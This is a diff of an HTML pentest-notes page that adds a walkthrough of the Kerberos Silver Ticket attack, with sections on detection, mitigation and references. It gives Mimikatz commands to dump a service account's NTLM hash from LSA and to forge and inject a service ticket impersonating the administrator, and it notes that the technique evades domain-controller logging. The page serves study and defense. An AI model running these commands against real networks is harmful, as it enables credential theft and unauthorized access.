@@ -27,7 +27,96 @@
     <div class="page" data-level="1">
       <div class="content">
         <h1>Silver Ticket</h1>
-        
+        <h2 id="silver-ticket">Silver Ticket</h2>
+<p>A Silver Ticket is a forged <strong><strong>Kerberos Service Ticket (TGS)</strong></strong> that allows access to a specific service without contacting a Domain Controller. It is created using the <strong><strong>NTLM hash of the target service account</strong></strong>, often a computer account (e.g., `HOST/`, `HTTP/`).</p>
+<h3 id="overview">Overview</h3>
+<ul>
+<li>Forged TGS for a specific service</li>
+<li>Does not require communication with a Domain Controller</li>
+<li>Uses the <strong><strong>service account&rsquo;s NTLM hash</strong></strong>, not KRBTGT</li>
+<li>Lower privilege, more stealthy than a Golden Ticket</li>
+</ul>
+<h3 id="prerequisites">Prerequisites</h3>
+<ul>
+<li>SYSTEM or Administrator access on a domain-joined machine</li>
+<li>Knowledge of:
+<ul>
+<li>NTLM hash of the target service account (e.g., machine account or managed service account)</li>
+<li>SPN (Service Principal Name)</li>
+<li>Domain name &amp; FQDN</li>
+<li>Domain SID</li>
+</ul>
+</li>
+</ul>
+<h3 id="key-concepts">Key Concepts</h3>
+<ul>
+<li><strong>Service Ticket (TGS)</strong>: Used to authenticate to a service (e.g., CIFS, MSSQL, HTTP)</li>
+<li><strong>SPN</strong>: Tied to the service account; uniquely identifies the Kerberos service</li>
+<li><strong>Computer account NTLM hash</strong> = used to sign TGS for that host</li>
+<li>Bypasses the KDC entirely; invisible to the Domain Controller</li>
+</ul>
+<h3 id="mimikatz-commands">Mimikatz Commands</h3>
+<h4 id="get-ntlm-hash-of-the-service-account">Get NTLM Hash of the Service Account</h4>
+<p>Typically done via secretsdump.py, DCSync, or LSASS dump.</p>
+<p>From Mimikatz (on DC or machine with SYSTEM access):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># privilege::debug</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># lsadump::lsa /inject /name:TARGETHOST$</span>
+</span></span></code></pre></div><p>Look for:
+NTLM: 92f8c3cbd7e9fc367ea85e3e05b47b0f</p>
+<h3 id="create-and-inject-silver-ticket">Create and Inject Silver Ticket</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /target:targethost.corp.local /service:cifs /rc4:92f8c3cbd7e9fc367ea85e3e05b47b0f /ptt /id:500</span>
+</span></span></code></pre></div><p>Explanation:</p>
+<ul>
+<li>`/user`: User to impersonate (e.g. administrator)</li>
+<li>`/domain`: Target domain</li>
+<li>`/sid`: Domain SID</li>
+<li>`/target`: FQDN of the service host (e.g. `host.corp.local`)</li>
+<li>`/service`: SPN prefix (e.g. `cifs`, `http`, `mssqlsvc`)</li>
+<li>`/rc4`: NTLM hash of service account</li>
+<li>`/id`: RID of impersonated user</li>
+<li>`/ptt`: Injects ticket into memory</li>
+</ul>
+<h3 id="validate-access">Validate Access</h3>
+<p>Example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dir \\targethost\c$
+</span></span><span style="display:flex;"><span>klist
+</span></span><span style="display:flex;"><span>whoami
+</span></span></code></pre></div><p>You should now have access to the service (e.g. `\\host\c$`).</p>
+<h2 id="common-target-spns">Common Target SPNs</h2>
+<ul>
+<li>`CIFS/host.domain` – file shares</li>
+<li>`HTTP/host.domain` – web apps, SharePoint</li>
+<li>`MSSQLSvc/host.domain:1433` – SQL Server</li>
+<li>`WSMAN/host.domain` – WinRM</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Access to specific services as a forged user</li>
+<li>No logs on Domain Controller (KDC not involved)</li>
+<li>Great for lateral movement or persistence</li>
+<li>Useful when Golden Ticket is too noisy</li>
+</ul>
+<h2 id="detection">Detection</h2>
+<ul>
+<li>Service tickets without corresponding TGT issuance</li>
+<li>Unusual user/service pairings</li>
+<li>Tickets from nonexistent users</li>
+<li>`Event ID 4624` logons to services with no matching `4768/4769` events</li>
+</ul>
+<h2 id="mitigation">Mitigation</h2>
+<ul>
+<li>Use AES-only authentication (silver ticket needs RC4)</li>
+<li>Rotate service account passwords regularly</li>
+<li>Restrict and monitor service account privileges</li>
+<li>Deploy Defender for Identity / endpoint telemetry</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://adsecurity.org/?p=2011">https://adsecurity.org/?p=2011</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview">https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview</a></li>
+<li><a href="https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-2/">https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-2/</a></li>
+</ul>
+
       </div>
       
 
@@ -273,6 +362,8 @@
    
 
    
+      
+   
 
    
 
@@ -368,6 +459,8 @@
 
    
       
+   
+
    
 
    
@@ -694,6 +787,8 @@
     <h4>Links to this note</h4>
     <div class="backlinks">
       <ul>
+       
+          <li><a href="/posts/kerberos/">Kerberos</a></li>
        
           <li><a href="/posts/pentest_active_directory/">Pentest - Active Directory</a></li>
        
